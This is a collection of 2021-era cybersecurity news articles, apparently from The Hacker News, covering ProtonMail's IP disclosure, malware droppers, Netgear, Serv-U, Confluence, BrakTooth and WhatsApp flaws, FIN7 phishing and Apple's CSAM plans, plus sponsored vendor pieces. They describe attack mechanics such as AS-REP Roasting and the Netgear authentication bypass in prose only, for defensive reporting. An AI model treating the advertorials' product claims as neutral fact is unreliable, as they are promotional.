'text': 'End-to-end encrypted email service provider ProtonMail has drawn criticism after it ceded to a legal request and shared the IP address of anti-gentrification activists with law enforcement authorities, leading to their arrests in France.\nThe Switzerland-based company said it received a “legally binding order from the Swiss Federal Department of Justice“ related to a collective called Youth for Climate, which it was “obligated to comply with,“ compelling it to handover the IP address and information related to the type of device used by the group to access the ProtonMail account.\n\nOn its website, ProtonMail advertises that: “No personal information is required to create your secure email account. By default, we do not keep any IP logs which can be linked to your anonymous email account. Your privacy comes first.“\nProtonmail Homepage\nDespite its no IP logs claims, the company acknowledged that while it’s illegal for the company to abide by requests from non-Swiss law enforcement authorities, it will be required to do so if Swiss agencies agree to assist foreign services such as Europol in their investigations.\n“There was no possibility to appeal or fight this particular request because an act contrary to Swiss law did in fact take place (and this was also the final determination of the Federal Department of Justice which does a legal review of each case),“ the company said in a lengthy response posted on Reddit.\nPut simply, ProtonMail will not only have to comply with Swiss government orders, it will be forced to hand over relevant data when individuals use the service to engage in activities that are deemed illegal in the country. This includes monitoring IP addresses from users in “extreme criminal cases,“ according to its transparency report.\n\n“Proton must comply with Swiss law. As soon as a crime is committed, privacy protections can be suspended and we’re required by Swiss law to answer requests from Swiss authorities,“ ProtonMail founder and CEO Andy Yen tweeted, adding “It’s deplorable that legal tools for serious crimes are being used in this way. But by law, [ProtonMail] must comply with Swiss criminal investigations. This is obviously not done by default, but only if legally forced.“\nIf anything, ProtonMail users who are concerned about the visibility of their IP addresses should use a VPN or access the email service over the Tor network for additional anonymity.\n“The prosecution in this case seems quite aggressive. Unfortunately, this is a pattern we have increasingly seen in recent years around the world (for example in France where terror laws are inappropriately used),“ the company said.\nUpdateIn a blog post titled “Important clarifications regarding arrest of climate activist,“ Andy Yen said the company “can be forced to collect information on accounts belonging to users under Swiss criminal investigation. This is obviously not done by default, but only if Proton gets a legal order for a specific account.“\nUpdated Protonmail Homepage\nFurthermore, in a revision to its privacy policy, ProtonMail now explicitly spells out that it will be forced to log users’ IP addresses if found in violation of Swiss laws —\n“By default, we do not keep permanent IP logs in relation with your use of the Services. However, IP logs may be kept temporarily to combat abuse and fraud, and your IP address may be retained permanently if you are engaged in activities that breach our terms and conditions (spamming, DDoS attacks against our infrastructure, brute force attacks, etc). The legal basis of this processing is our legitimate interest to protect our Services against nefarious activities. If you are breaking Swiss law, ProtonMail can be legally compelled to log your IP address as part of a Swiss criminal investigation.“Note — The headline of the article has been revised to reflect that ProtonMail can enable logging of IP addresses pursuant to Swiss court orders.\n\n\nFound this article interesting?

'text': 'An ongoing campaign has been found to leverage a network of websites acting as a “dropper as a service“ to deliver a bundle of malware payloads to victims looking for “cracked“ versions of popular business and consumer applications.\n“These malware included an assortment of click fraud bots, other information stealers, and even ransomware,“ researchers from cybersecurity firm Sophos said in a report published last week.\nThe attacks work by taking advantage of a number of bait pages hosted on WordPress that contain “download“ links to software packages, which, when clicked, redirect the victims to a different website that delivers potentially unwanted browser plug-ins and malware, such as installers for Raccoon Stealer, Stop ransomware, the Glupteba backdoor, and a variety of malicious cryptocurrency miners that masquerade as antivirus solutions.\n\n“Visitors who arrive on these sites are prompted to allow notifications; If they allow this to happen, the websites repeatedly issue false malware alerts,“ the researchers said. “If the users click the alerts, they’re directed through a series of websites until they arrive at a destination that’s determined by the visitor’s operating system, browser type, and geographic location.“\n\nUsing techniques like search engine optimization, links to the websites appear at the top of search results when individuals search for pirated versions of a wide range of software apps. The activities, considered to be the product of an underground marketplace for paid download services, allows entry-level cyber actors to set up and tailor their campaigns based on geographical targeting. \nTraffic exchanges, as the distribution infrastructure is also called, typically require a Bitcoin payment before affiliates can create accounts on the service and begin distributing installers, with sites like InstallBest offering advice on “best practices,“ such as recommending against using Cloudflare-based hosts for downloaders, as well as using URLs within Discord’s CDN, Bitbucket, or other cloud platforms.\n\nOn top of that, the researchers also found a number of services that, instead of offering their own malware delivery networks, act as “go-betweens“ to established malvertising networks that pay website publishers for traffic. One such traffic supplier is InstallUSD, a Pakistan-based advertising network, which has been linked to a number of malware campaigns involving the cracked software sites.\n\nThis is far from the first time “warez“ websites have been put to use as an infection vector by threat actors. Earlier this June, a cryptocurrency miner called Crackonosh was found abusing the method to install a coin miner package called XMRig for stealthily exploiting the infected host’s resources to mine Monero.\nA month later, the attackers behind a piece of malware dubbed MosaicLoader were found targeting individuals searching for cracked software as part of a global campaign to deploy a fully-featured backdoor capable of roping the compromised Windows systems into a botnet.\n\n\nFound this article interesting?

'text': 'Networking, storage and security solutions provider Netgear on Friday issued patches to address three security vulnerabilities affecting its smart switches that could be abused by an adversary to gain full control of a vulnerable device.\nThe flaws, which were discovered and reported to Netgear by Google security engineer Gynvael Coldwind, impact the following models -\nGC108P (fixed in firmware version 1.0.8.2)GC108PP (fixed in firmware version 1.0.8.2)GS108Tv3 (fixed in firmware version 7.0.7.2)GS110TPP (fixed in firmware version 7.0.7.2)GS110TPv3 (fixed in firmware version 7.0.7.2)GS110TUP (fixed in firmware version 1.0.5.3)GS308T (fixed in firmware version 1.0.3.2)GS310TP (fixed in firmware version 1.0.3.2)GS710TUP (fixed in firmware version 1.0.5.3)GS716TP (fixed in firmware version 1.0.4.2)GS716TPP (fixed in firmware version 1.0.4.2)GS724TPP (fixed in firmware version 2.0.6.3)GS724TPv2 (fixed in firmware version 2.0.6.3)GS728TPPv2 (fixed in firmware version 6.0.8.2)GS728TPv2 (fixed in firmware version 6.0.8.2)GS750E (fixed in firmware version 1.0.1.10)GS752TPP (fixed in firmware version 6.0.8.2)GS752TPv2 (fixed in firmware version 6.0.8.2)MS510TXM (fixed in firmware version 1.0.4.2)MS510TXUP (fixed in firmware version 1.0.4.2)\nAccording to Coldwind, the flaws concern an authentication bypass, an authentication hijacking, and a third as-yet-undisclosed vulnerability that could grant an attacker the ability to change the administrator password without actually having to know the previous password or hijack the session bootstrapping information, resulting in a full compromise of the device.\n\nThe three vulnerabilities have been given the codenames Demon’s Cries (CVSS score: 9.8), Draconian Fear (CVSS score: 7.8), and Seventh Inferno (TBD).\n“A funny bug related to authorization spawns from the fact that the password is obfuscated by being XORed with ’NtgrSmartSwitchRock,“ Coldwind said in a write-up explaining the authentication bypass. “However, due to the fact that in the handler of TLV type 10 an strlen() is called on the still obfuscated password, it makes it impossible to authenticate correctly with a password that happens to have the same character as the phrase above at a given position.“\nDraconian Fear, on the other hand, requires the attacker to either have the same IP address as the admin or be able to spoof the address through other means. In such a scenario, the malicious party can take advantage of the fact that the Web UI relies only on the IP and a trivially guessable “userAgent“ string to flood the authentication endpoint with multiple requests, thereby “greatly increasing the odds of getting the session information before admin’s browser gets it.“\nIn light of the critical nature of the vulnerabilities, companies relying on the aforementioned Netgear switches are recommended to upgrade to the latest version as soon as possible to mitigate any potential exploitation risk.\n\n\nFound this article interesting?

{'title': 'Apple Delays Plans to Scan Devices for Child Abuse Images After Privacy Backlash',
'text': 'Apple is temporarily hitting the pause button on its controversial plans to screen users’ devices for child sexual abuse material (CSAM) after receiving sustained blowback over worries that the tool could be weaponized for mass surveillance and erode the privacy of users.\n“Based on feedback from customers, advocacy groups, researchers, and others, we have decided to take additional time over the coming months to collect input and make improvements before releasing these critically important child safety features,“ the iPhone maker said in a statement on its website.\n\nThe announcement, however, doesn’t make it clear as to the kind of inputs it would be gathering, the nature of changes it aims to devise, or how it intends to implement the system in a way that mitigates the privacy and security concerns that could arise once it’s deployed.\nThe changes were originally slated to go live with iOS 15 and macOS Monterey later this year, starting with the U.S.\nIn August, Apple detailed several new features intended to help limit the spread of CSAM on its platform, including scanning users’ iCloud Photos libraries for illicit content, a Communication Safety option in Messages app to warn children and their parents when receiving or sending sexually explicit photos, and expanded guidance in Siri and Search when users try to perform searches for CSAM-related topics.\nThe so-called NeuralHash technology would have worked by matching photos on users’ iPhones, iPads, and Macs just before they are uploaded to iCloud Photos against a database of known child sexual abuse imagery maintained by the National Center for Missing and Exploited Children (NCMEC) without having to possess the images or glean their contents. iCloud accounts that crossed a set threshold of 30 matching hashes would then be manually reviewed, have their profiles disabled, and reported to law enforcement.\nThe measures aimed to strike a compromise between protecting customers’ privacy and meeting growing demands from government agencies in investigations pertaining to terrorism and child pornography — and by extension, offer a solution to the so-called “going dark“ problem of criminals taking advantage of encryption protections to cloak their contraband activities.\nHowever, the proposals were met with near-instantaneous backlash, with the Electronic Frontier Foundation (EFF) calling out the tech giant for attempting to create an on-device surveillance system, adding “a thoroughly documented, carefully thought-out, and narrowly-scoped backdoor is still a backdoor.“\n“Once this capability is built into Apple products, the company and its competitors will face enormous pressure — and potentially legal requirements — from governments around the world to scan photos not just for CSAM, but also for other images a government finds objectionable,“ the Center for Democracy & Technology (CDT) said in an open letter.\n“Those images may be of human rights abuses, political protests, images companies have tagged as “terrorist“ or violent extremist content, or even unflattering images of the very politicians who will pressure the company to scan for them. And that pressure could extend to all images stored on the device, not just those uploaded to iCloud. Thus, Apple will have laid the foundation for censorship, surveillance, and persecution on a global basis,“ the letter read.\nBut in an email circulated internally at Apple, child safety campaigners were found dismissing the complaints of privacy activists and security researchers as the “screeching voice of the minority.“\n\nApple has since stepped in to assuage potential concerns arising out of unintended consequences, pushing back against the possibility that the system could be used to detect other forms of photos at the request of authoritarian governments. “Let us be clear, this technology is limited to detecting CSAM stored in iCloud and we will not accede to any government’s request to expand it,“ the company said.\nStill, it did nothing to allay fears that the client-side scanning could amount to troubling invasions of privacy and that it could be expanded to further abuses, and provide a blueprint for breaking end-to-end encryption. It also didn’t help that researchers were able to create “hash collisions“ — aka false positives — by reverse-engineering the algorithm, leading to a scenario where two completely different images generated the same hash value, thus effectively tricking the system into thinking the images were the same when they’re not.\n“My suggestions to Apple: (1) talk to the technical and policy communities before you do whatever you’re going to do. Talk to the general public as well. This isn’t a fancy new Touch Bar: it’s a privacy compromise that affects 1 billion users,“ Johns Hopkins professor and security researcher Matthew D. Green tweeted.\n“Be clear about why you’re scanning and what you’re scanning. Going from scanning nothing (but email attachments) to scanning everyone’s private photo library was an enormous delta. You need to justify escalations like this,“ Green added.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'Microsoft has shared technical details about a now-fixed, actively exploited critical security vulnerability affecting SolarWinds Serv-U managed file transfer service that it has attributed with “high confidence“ to a threat actor operating out of China.\nIn mid-July, the Texas-based company remedied a remote code execution flaw (CVE-2021-35211) that was rooted in Serv-U’s implementation of the Secure Shell (SSH) protocol, which could be abused by attackers to run arbitrary code on the infected system, including the ability to install malicious programs and view, change, or delete sensitive data.\n\n“The Serv-U SSH server is subject to a pre-auth remote code execution vulnerability that can be easily and reliably exploited in the default configuration,“ Microsoft Offensive Research and Security Engineering team said in a detailed write-up describing the exploit.\n“An attacker can exploit this vulnerability by connecting to the open SSH port and sending a malformed pre-auth connection request. When successfully exploited, the vulnerability could then allow the attacker to install or run programs, such as in the case of the targeted attack we previously reported,“ the researchers added.\nWhile Microsoft linked the attacks to DEV-0322, a China-based collective citing “observed victimology, tactics, and procedures,“ the company has now revealed that the remote, pre-auth vulnerability stemmed from the manner the Serv-U process handled access violations without terminating the process, thereby making it simple to pull off stealthy, reliable exploitation attempts.\n\n“The exploited vulnerability was caused by the way Serv-U initially created an OpenSSL AES128-CTR context,“ the researchers said. “This, in turn, could allow the use of uninitialized data as a function pointer during the decryption of successive SSH messages.“\n“Therefore, an attacker could exploit this vulnerability by connecting to the open SSH port and sending a malformed pre-auth connection request. We also discovered that the attackers were likely using DLLs compiled without address space layout randomization (ASLR) loaded by the Serv-U process to facilitate exploitation,“ the researchers added.\n\nASLR refers to a protection mechanism that’s used to increase the difficulty of performing a buffer overflow attack by randomly arranging the address space positions where system executables are loaded into memory.\nMicrosoft, which reported the vulnerability to SolarWinds, said it recommended enabling ASLR compatibility for all binaries loaded in the Serv-U process. “ASLR is a critical security mitigation for services which are exposed to untrusted remote inputs, and requires that all binaries in the process are compatible in order to be effective at preventing attackers from using hardcoded addresses in their exploits, as was possible in Serv-U,“ the researchers said.\nIf anything, the revelations highlight the variety of techniques and tools used by threat actors to breach corporate networks, including piggybacking on legitimate software.\nAlthough the SolarWinds supply chain attacks have been formally pinned on Russian APT29 hackers, Microsoft in December 2020 disclosed that a separate espionage group may have been taking advantage of the IT infrastructure provider’s Orion software to drop a persistent backdoor called Supernova on infected systems. Cybersecurity firm Secureworks connected the intrusions to a China-linked threat actor called Spiral.\n\n\nFound this article interesting?

The warning was also echoed by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and Atlassian itself in a series of independent advisories.\n\nBad Packets noted on Twitter it “detected mass scanning and exploit activity from hosts in Brazil, China, Hong Kong, Nepal, Romania, Russia and the U.S. targeting Atlassian Confluence servers vulnerable to remote code execution.“\nAtlassian Confluence is a widely popular web-based documentation service that allows teams to create, collaborate, and organize on different projects, offering a common platform to share information in corporate environments. It counts several major companies, including Audi, Docker, GoPro, Hubspot, LinkedIn, Morningstar, NASA, The New York Times, and Twilio, among its customers.\nThe development comes days after the Australian company rolled out security updates on August 25 for an OGNL (Object-Graph Navigation Language) injection flaw that, in specific instances, could be exploited to execute arbitrary code on a Confluence Server or Data Center instance.\nPut differently, an adversary can leverage this weakness to execute any command with the same permissions as the user running the service, and worse, abuse the access to gain elevated administrative permissions to stage further attacks against the host using unpatched local vulnerabilities.\nThe flaw, which has been assigned the identifier CVE-2021-26084 and has a severity rating of 9.8 out of 10 on the CVSS scoring system, impacts all versions prior to 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.\n\nThe issue has been addressed in the following versions —\n6.13.237.4.117.11.67.12.57.13.0\nIn the days since the patches were issued, multiple threat actors have seized the opportunity to capitalize on the flaw by mass scanning vulnerable Confluence servers to ensnare potential victims and install crypto miners after a proof-of-concept (PoC) exploit was publicly released earlier this week.

'text': 'Cybersecurity researchers have disclosed details about a new malware family that relies on the Common Log File System (CLFS) to hide a second-stage payload in registry transaction files in an attempt to evade detection mechanisms.\nFireEye’s Mandiant Advanced Practices team, which made the discovery, dubbed the malware PRIVATELOG, and its installer, STASHLOG. Specifics about the identities of the threat actor or their motives remain unclear.\nAlthough the malware is yet to be detected in real-world attacks aimed at customer environments or be spotted launching any second-stage payloads, Mandiant suspects that PRIVATELOG could still be in development, the work of a researcher, or deployed as part of a highly targeted activity.\n\nCLFS is a general-purpose logging subsystem in Windows that’s accessible to both kernel-mode as well as user-mode applications such as database systems, OLTP systems, messaging clients, and network event management systems for building and sharing high-performance transaction logs.\n“Because the file format is not widely used or documented, there are no available tools that can parse CLFS log files,“ Mandiant researchers explained in a write-up published this week. “This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions.“\n\nPRIVATELOG and STASHLOG come with capabilities that allow the malicious software to linger on infected devices and avoid detection, including the use of obfuscated strings and control flow techniques that are expressly designed to make static analysis cumbersome. What’s more, the STASHLOG installer accepts a next-stage payload as an argument, the contents of which are subsequently stashed in a specific CLFS log file.\n\nFashioned as an un-obfuscated 64-bit DLL named “prntvpt.dll,“ PRIVATELOG, in contrast, leverages a technique called DLL search order hijacking in order to load the malicious library when it is called by a victim program, in this case, a service called “PrintNotify.“\n“Similarly to STASHLOG, PRIVATELOG starts by enumerating *.BLF files in the default user’s profile directory and uses the .BLF file with the oldest creation date timestamp,“ the researchers noted, before using it to decrypt and store the second-stage payload.\nMandiant recommends that organizations apply YARA rules to scan internal networks for signs of malware and watch out for potential Indicators of Compromise (IoCs) in “process“, “imageload“ or “filewrite“ events associated with endpoint detection and response (EDR) system logs.\n\n\nFound this article interesting?

'text': 'A recent wave of spear-phishing campaigns leveraged weaponized Windows 11 Alpha-themed Word documents with Visual Basic macros to drop malicious payloads, including a JavaScript implant, against a point-of-sale (PoS) service provider located in the U.S.\nThe attacks, which are believed to have taken place between late June to late July 2021, have been attributed with “moderate confidence“ to a financially motivated threat actor dubbed FIN7, according to researchers from cybersecurity firm Anomali.\n“The specified targeting of the Clearmind domain fits well with FIN7’s preferred modus operandi,“ Anomali Threat Research said in a technical analysis published on September 2. “The group’s goal appears to have been to deliver a variation of a JavaScript backdoor used by FIN7 since at least 2018.“\n\nAn Eastern European group active since at least mid-2015, FIN7 has a checkered history of targeting restaurant, gambling, and hospitality industries in the U.S. to plunder financial information such as credit and debit card numbers that were then used or sold for profit on underground marketplaces.\n\nAlthough multiple members of the collective have been imprisoned for their roles in different campaigns since the start of the year, FIN7’s activities have also been tied to another group called Carbanak, given its similar TTPs, with the main distinction being that while FIN7 focuses on hospitality and retail sectors, Carbanak has singled out banking institutions.\nIn the latest attack observed by Anomali, the infection commences with a Microsoft Word maldoc containing a decoy image that’s purported to have been “made on Windows 11 Alpha.“ The image urges the recipient to enable macros to trigger the next stage of activity, which involves executing a heavily-obfuscated VBA macro to retrieve a JavaScript payload, which, in turn, has been found to share similar functionality with other backdoors used by FIN7.\n\nBesides taking several steps to try to impede analysis by populating the code with junk data, the VB script also checks if it is running under a virtualized environment such as VirtualBox and VMWare, and if so, terminates itself, in addition to stopping the infection chain upon detecting Russian, Ukrainian, or several other Eastern European languages.\nThe backdoor’s attribution to FIN7 stems from overlaps in the victimology and techniques adopted by the threat actor, including the use of a JavaScript-based payload to plunder valuable information.\n“FIN7 is one of the most notorious financially motivated groups due to the large amounts of sensitive data they have stolen through numerous techniques and attack surfaces,“ the researchers said. “Things have been turbulent for the threat group over the past few years as with success and notoriety comes the ever-watchful eye of the authorities.

{'title': 'What is AS-REP Roasting attack, really?',
'text': 'Microsoft’s Active Directory is said to be used by 95% of Fortune 500. As a result, it is a prime target for attackers as they look to gain access to credentials in the organization, as compromised credentials provide one of the easiest ways for hackers to access your data.\nA key authentication technology that underpins Microsoft Active Directory is Kerberos. Unfortunately, hackers use many different attacks against Active Directory’s implementation of the Kerberos authentication protocol. One of those is AS-REP Roasting. So what is AS-REP Roasting, and how can businesses protect themselves?\nWhat is Active Directory Kerberos?\nKerberos was originally developed by the Massachusetts Institute of Technology (MIT) and centered around using tickets to establish trust. Microsoft’s implementation of Kerberos found in Active Directory is based on Kerberos Network Authentication Service (V5) as defined in RFC 4120. However, Microsoft has added to and enhanced Kerberos with its protocol specifications and several extensions.\nThere are three different components found in Kerberos authentication as found in Microsoft Active Directory. These include:\nClient - The client is the entity that is looking to obtain tickets from the KDCApplication Server - The resource that needs the issued tickets presented for authenticationKey Distribution Center (KDC) - The KDC is the trusted third-party that issues the authentication tickets. In Microsoft Active Directory, the KDC is each domain controller servicing the Active Directory domain. \nOverview of the Kerberos authentication protocol ticket exchange\nEssential for understanding the risks associated with Active Directory credential theft, Kerberos is the default protocol used when logging into a Windows machine part of an Active Directory domain. It has been the default authentication protocol, replacing NTLM since Windows 2000 and later. What are the differences between the two?\nThe two protocols manage authentication differently. The NTLM authentication protocol relies on a three-way handshake. The authentication information is exchanged between the client and server to authenticate a user. Conversely, Kerberos uses a two-way process that relies on a ticket-granting service using a key distribution center (KDC).\nNTLM uses password hashing, whereas Kerberos uses encryption. While Kerberos is the default authentication method, NTLM is still used as a fallback authentication protocol. If authentication can’t happen using Kerberos, the system will use NTLM instead.\nWhat is AS-REP Roasting?\nEven though Kerberos is a much more secure authentication protocol than NTLM, it is not without its own set of vulnerabilities, some of which can stem from the specific user account settings configured for the account in Active Directory.\nOne of the first steps in Kerberos authentication is preauthentication. Pre-authentication uses the user’s password to encrypt a timestamp. The domain controller (DC) will decrypt this to validate the correct password and not have a previous request replayed. A vulnerability can result when preauthentication is disabled.\nOnce this is disabled, a hacker can request authentication data for any user, and the DC will return an encrypted ticket-granting ticket (TGT). It can then be used to brute force in an offline environment to crack the password.\nPreauthentication can be disabled on any user account in Active Directory on the Account tab under the Account options. Look for the checkbox “Do not require Kerberos preauthentication.“ \nSetting the do not require Kerberos preauthentication flag in Active Directory\nAS-REP Roasting is the technique that allows retrieving password hashes for users that have this flag set in Active Directory. Additionally, various cybersecurity and hacking tools allow cracking the TGTs harvested from Active Directory. These include Rubeus and Hashcat.\nUsing a tool like Rubeus, attackers can find the accounts that do not require preauthentication and then extract the ticket-granting ticket (TGT) data for cracking the password offline.\nData can be transformed into a format that can be cracked by an offline tool such as Hashcat, which can use brute force password cracking against the hashes. This process incorporates the use of a dictionary file for brute-force password guessing.\nPreventing the AS-REP Roasting attack\nAn obvious way to prevent the AS-REP Roasting attack is to audit your Active Directory environment and ensure there are no accounts configured with the “Do not require Kerberos preauthentication.“\nIn addition to auditing your Active Directory settings for improperly configured preauthentication, you want to make sure users are required to use strong, complex passwords. \nAlso, it is vital to ensure passwords are not found in a breached password database as breached password lists are used to crack passwords extracted using the AS-REP Roasting attack. Breached password protection is not natively found in Active Directory. So, a third-party solution is required for this type of protection.\nBreached password protection with Specops\nEnforcing effective password policies and using a breached password protection solution for Active Directory is essential to ensure your environment is not vulnerable to Kerberos attacks such as AS-REP Roasting. In addition, effective password policies help ensure users are using strong passwords that are not easily guessed or otherwise easy to attack with brute force or other common password attacks.\nSpecops Password Policy takes password policies into the modern era with functionality and features not natively found in Active Directory. It prevents weak and even breached passwords from use in the environment using one of the most important features of Specops Password Policy, Breached Password Protection.\nRecently, Specops released the next iteration of Breached Password Protection with Live Attack Data. The Live Attack Data comes from a global honeypot solution used by Specops to gather the passwords that are used in live brute force attacks. These are integrated with the current protection offered by Specops to customers using the Breached Password database and the solution is continuously updated with the most recent breached passwords.\nIn addition, with Breached Password Protection found in Specops Password Policy, organizations can quickly implement breached password protection to prevent users from using compromised passwords. For example, if users attempt to choose a password found in the extensive database of breached passwords maintained by Specops (over two billion), the password is not accepted. In addition, if a user’s password becomes breached after it has been defined in Active Directory, organizations can use Specops Password Policy to force their users to change the password at next login. \nSpecops Password Policy Breached Password Protection\nOn top of the Breached Password Protection in Specops Password Policy, it adds many other features and benefits to bolster your organization’s ability to tailor password policies to fit the business needs and maintain high levels of security in your environment. These include:\nAbility to add multiple custom password dictionariesLength-based password agingBuilt-in password expiration notificationsPassword content restrictionsRegular expressions to further control password contentMultiple password reset optionsMinimum number of characters that are required changed for a password reset\nConsiderations\nActive Directory is the number one identity solution used in organizations today. Unfortunately, his means attackers heavily target Active Directory environments to find ways to steal credentials. Their attack methods include attacking the authentication protocols used by Active Directory, including Kerberos. AS-REP Roasting is a type of attack that looks to find accounts with the preauthentication flag for Kerberos unset for users.\nOnce found, hacking tools can be used to brute force user passwords. One of the best ways organizations can defend themselves is to have good password policies in place along with breached password protection, as attackers often use breached password databases in an AS-REP Roasting attack. Specops Password Policy helps businesses bolster their password security, including Breached Password Protection.\n\n\nFound this article interesting?

{'title': 'New BrakTooth Flaws Leave Millions of Bluetooth-enabled Devices Vulnerable',
'text': 'A set of new security vulnerabilities has been disclosed in commercial Bluetooth stacks that could enable an adversary to execute arbitrary code and, worse, crash the devices via denial-of-service (DoS) attacks. \nCollectively dubbed “BrakTooth“ (referring to the Norwegian word “Brak“ which translates to “crash“), the 16 security weaknesses span across 13 Bluetooth chipsets from 11 vendors such as Intel, Qualcomm, Zhuhai Jieli Technology, and Texas Instruments, covering an estimated 1,400 or more commercial products, including laptops, smartphones, programmable logic controllers, and IoT devices.\n\nThe flaws were disclosed by researchers from the ASSET (Automated Systems SEcuriTy) Research Group at the Singapore University of Technology and Design (SUTD).\n\n“All the vulnerabilities […] can be triggered without any previous pairing or authentication,“ the researchers noted. “The impact of our discovered vulnerabilities is categorized into (I) crashes and (II) deadlocks. Crashes generally trigger a fatal assertion, segmentation faults due to a buffer or heap overflow within the SoC firmware. Deadlocks, in contrast, lead the target device to a condition in which no further BT communication is possible.“\n\nThe most severe of the 16 bugs is CVE-2021-28139, which affects the ESP32 SoC used in many Bluetooth-based appliances ranging from consumer electronics to industrial equipment. Arising due to a lack of an out-of-bounds check in the library, the flaw enables an attacker to inject arbitrary code on vulnerable devices, including erasing its NVRAM data.\nOther vulnerabilities could result in the Bluetooth functionality getting entirely disabled via arbitrary code execution, or cause a denial-of-service condition in laptops and smartphones employing Intel AX200 SoCs. “This vulnerability allows an attacker to forcibly disconnect slave BT devices currently connected to AX200 under Windows or Linux Laptops,“ the researchers said. “Similarly, Android phones such as Pocophone F1 and Oppo Reno 5G experience BT disruptions.“\n\nAdditionally, a third collection of flaws discovered in Bluetooth speakers, headphones, and audio modules could be abused to freeze and even completely shut down the devices, requiring the users to manually turn them back on. Troublingly, all the aforementioned BrakTooth attacks could be carried out with a readily available Bluetooth packet sniffer that costs less than $15.\n\nWhile Espressif, Infineon (Cypress), and Bluetrum Technology have released firmware patches to rectify the identified vulnerabilities, Intel, Qualcomm, and Zhuhai Jieli Technology are said to be investigating the flaws or in the process of readying security updates. Texas Instruments, however, doesn’t intend to release a fix unless “demanded by customers.“\nThe ASSET group has also made available a proof-of-concept (PoC) tool that can be used by vendors producing Bluetooth SoCs, modules, and products to replicate the vulnerabilities and validate against BrakTooth attacks.\n\n\nFound this article interesting?

'text': 'A now-patched high-severity security vulnerability in WhatApp’s image filter feature could have been abused to send a malicious image over the messaging app to read sensitive information from the app’s memory.\nTracked as CVE-2020-1910 (CVSS score: 7.8), the flaw concerns an out-of-bounds read/write and stems from applying specific image filters to a rogue image and sending the altered image to an unwitting recipient, thereby enabling an attacker to access valuable data stored the app’s memory.\n\n“A missing bounds check in WhatsApp for Android prior to v2.21.1.13 and WhatsApp Business for Android prior to v2.21.1.13 could have allowed out-of-bounds read and write if a user applied specific image filters to a specially-crafted image and sent the resulting image,“ WhatsApp noted in its advisory published in February 2021.\nCybersecurity firm Check Point Research, which disclosed the issue to the Facebook-owned platform on November 10, 2020, said it was able to crash WhatsApp by switching between various filters on the malicious GIF files.\n\nSpecifically, the issue was rooted in an “applyFilterIntoBuffer()“ function that handles image filters, which takes the source image, applies the filter selected by the user, and copies the result into the destination buffer. By reverse-engineering the “libwhatsapp.so“ library, the researchers found that the vulnerable function relied on the assumption that both the source and filtered images have the same dimensions and also the same RGBA color format.\n\nGiven that each RGBA pixel is stored as 4 bytes, a malicious image having only 1 byte per pixel can be exploited to achieve an out-of-bounds memory access since the “function tries to read and copy 4 times the amount of the allocated source image buffer.“\nWhatsApp said it has “no reason to believe users would have been impacted by this bug.“ Since WhatsApp version 2.21.1.13, the company has added two new checks on the source image and filter image that ensure that both source and filter images are in RGBA format and that the image has 4 bytes per pixel to prevent unauthorized reads.\n\n\nFound this article interesting?

{'title': 'Is Traffic Mirroring for NDR Worth the Trouble? We Argue It Isn’t',
'text': 'Network Detection & Response (NDR) is an emerging technology developed to close the blind security spots left by conventional security solutions, which hackers exploited to gain a foothold in target networks.\nNowadays, enterprises are using a plethora of security solutions to protect their network from cyber threats. The most prominent ones are Firewalls, IPS/IDS, SIEM, EDR, and XDR (which combines the functionality of EDR and SIEM). However, all these solutions suffer from security gaps that prevent them from stopping advanced cyber-attacks efficiently. \nNDR was developed based on Intrusion Detection System (IDS). An IDS solution is installed on the network perimeter and monitors the network traffic for suspicious activities.\nIDS systems suffer from many downsides that make them inefficient in stopping modern cyber-attacks: IDS use signature-based detection techniques to discover abnormal activities, making them unable to spot unknown attacks.\nIn addition, IDS systems trigger a large number of security alerts. This results in wasting security team time and making them unable to investigate all security alerts. And finally, IDS was not built to provide any response or investigation capabilities, making it unable to respond efficiently to ongoing cyberattacks.\nNetwork Detection & Response to extract information from network traffic\nNDR was the response to mitigate the downsides that IDS systems fail to protect. NDR systems go beyond signature-based detection and analyze all network traffic coming inside or exiting the network and create a baseline of normal network activity. The baseline is used later to compare current traffic with regular network activity to detect suspicious behaviors.\nNDR solutions utilize advanced technologies to detect emerging and unknown threats, such as Machine Learning and Artificial Intelligence (AI). Using these technologies allows NDR systems to convert information gathered from network traffic into actionable intelligence used to detect and stop unknown cyber threats. \nAn NDR solution can run automatically independent of human supervision to detect cyber threats and respond to them. NDR can also integrate with existing security solutions such as SIEM and SOAR for enhanced detection and response. \nTraditional NDRs flaws in handling encryption and the increasing amount of data\nUp until now, NDRs relied on traffic mirroring, typically combined with hardware sensors to extract the information – very similar to how IDS used to do it. However, there are three game-changers increasingly challenging this approach: \nA large share of internet traffic is encrypted, according to the Google Transparency Report, already 90% of the web traffic. Therefore, the traditional traffic mirroring cannot longer extract information from payload and is thus losing its effectiveness. Increasing bandwidths and new networking technologies, making traffic mirroring expensive or even infeasible.A shift towards highly distributed hybrid networks where simply analyzing traffic on one or two core switches is no longer enough. Many collection points need to be monitored, which makes traffic mirroring-based solutions even more expensive to operate. \nTaking these developments into account, mirroring networks is not a future-oriented solution for securing networks anymore. \nExeonTrace: A trusted future-proof NDR solution\nExeonTrace does not require mirroring the network traffic to detect threats and decrypt encrypted traffic; it uses algorithms that don’t operate on payload, but on light-weight network log data exported from an existing network infrastructure via NetFlow.\nThis enables it to analyse metadata passing through the network at many collection points to discover covert communication channels employed by advanced threat actors, such as APT and ransomware attacks.\nNetFlow is an open standard that enables networking devices (e.g., routers, switches, or firewalls) to export metadata of all connections passing through them (physical network, virtualised environment, and private cloud environment – or what is known as north-south and east-west monitoring capability). Thus, this approach is optimal for distributed networks which include cloud environments as well.\nExeonTrace solution provides comprehensive visibility over your entire IT environment, including connected cloud services, shadow IT devices, and can detect non-malware attacks such as insider threats, credential abuse, and data exfiltration. The complete network visibility will make it feasible to inspect all network traffic entering or leaving your enterprise network.\nExeonTrace will not stop here, as it will monitor all internal interactions between all devices across your enterprise network, to detect advanced threat actors hiding in your networks, such as APT and Ransomware.\nExeonTrace’s utilisation of supervised and unsupervised Machine Learning models allows it to detect non-malware threats, such as insider threat, lateral movement, data leakage, and internal reconnaissance. ExeonTrace also enables the addition of network-based custom rulesets to verify all users are adhering to the implemented security policies (e.g., stopping users from using particular protocols). On top, ExeonTrace can integrate with available threat feeds or use a customer-specific threat feed to detect known threats. \nConclusion \nNDR systems have become a necessity to stop the 